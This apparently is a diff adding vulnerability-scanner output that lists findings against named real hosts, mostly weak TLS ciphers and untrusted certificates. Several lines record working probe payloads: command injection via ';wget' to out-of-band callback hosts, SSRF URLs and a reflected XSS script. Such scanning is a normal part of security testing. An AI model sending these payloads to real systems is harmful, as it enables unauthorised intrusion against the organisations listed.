@@ -1,0 +1,42 @@
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://da05jlaai4kjlh8gvtbg97rg1bztbfbmg.oast.pro;
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://da05jlaai4kjlh8gvtbgs59rpw5ppwpkf.oast.pro;
+[CVE-2017-9506] [http] [medium] https://ddocs-indexer.fileverse.io/plugins/servlet/oauth/users/icon-uri?consumerUri=http://da05jlaai4kjlh8gvtbggypfsu3yugapu.oast.pro
+[CVE-2021-33544] [http] [high] https://ddocs-indexer.fileverse.io//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://da05jlaai4kjlh8gvtbg66zfz5381qukq.oast.pro)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2022-2488] [http] [critical] https://ddocs-indexer.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://da05jlaai4kjlh8gvtbgrgofraxm5a6mg.oast.pro;
+[CVE-2025-55182] [http] [critical] https://dashboard.layeredge.io
+[weak-cipher-suites:tls-1.0] [ssl] [low] data-api-worker-test.uniswap.org:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] data-api-worker-test.uniswap.org:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] data-api-worker.uniswap.org:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] data-api-worker.uniswap.org:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] data.dappier.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] data.dappier.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] data.dev.dappier.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] data.dev.dappier.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] data.staging.dappier.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] data.staging.dappier.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] datastore.dappier.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] datastore.dappier.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] db-discovery.teller.org:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] db-discovery.teller.org:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] ddocs-indexer.fileverse.io:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] ddocs-indexer.fileverse.io:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] de.dappier.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] de.dappier.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] de.dev.dappier.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] de.dev.dappier.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] de.staging.dappier.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] de.staging.dappier.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] dedicated-backend.socket.tech:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] dedicated-backend.socket.tech:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[CVE-2017-0929] [http] [high] https://ddocs-indexer.fileverse.io/DnnImageHandler.ashx?mode=file&url=http://da05jlaai4kjlh8gvtbguj7g1uszx1i76.oast.pro
+[CVE-2017-18638] [http] [high] https://ddocs-indexer.fileverse.io/composer/send_email?to=SHyP@rkAz&url=http://da05jlaai4kjlh8gvtbgmdbokeefzpgnn.oast.pro
+[CVE-2018-1000600] [http] [high] https://ddocs-indexer.fileverse.io/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://da05jlaai4kjlh8gvtbgbuhwtsj6zsy5r.oast.pro
+[CVE-2015-8813] [http] [high] https://ddocs-indexer.fileverse.io/Umbraco/feedproxy.aspx?url=http://da05jlaai4kjlh8gvtbgkcjfieidrtnz5.oast.pro
+[CVE-2020-5775] [http] [medium] https://ddocs-indexer.fileverse.io/external_content/retrieve/oembed?endpoint=http://da05jlaai4kjlh8gvtbgkqadk1dnnytyj.oast.pro&url=foo
+[netlify-headers-config-exposure] [http] [low] https://dashboard.aws-us-west-2-backend-staging2.vapi.ai/_headers
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://de-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[CVE-2020-10770] [http] [medium] https://ddocs-indexer.fileverse.io/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://da05jlaai4kjlh8gvtbgqck3yizzesja8.oast.pro/
+[self-signed-ssl] [ssl] [low] db-reverse-proxy.infra-stress.candide.dev:443
+[untrusted-root-certificate] [ssl] [low] dcs-web-lb.idns-ext.xerox.com:443
+[untrusted-root-certificate] [ssl] [low] dcs-a.support.xerox.com:443
+[untrusted-root-certificate] [ssl] [low] dcs.support.xerox.com:443
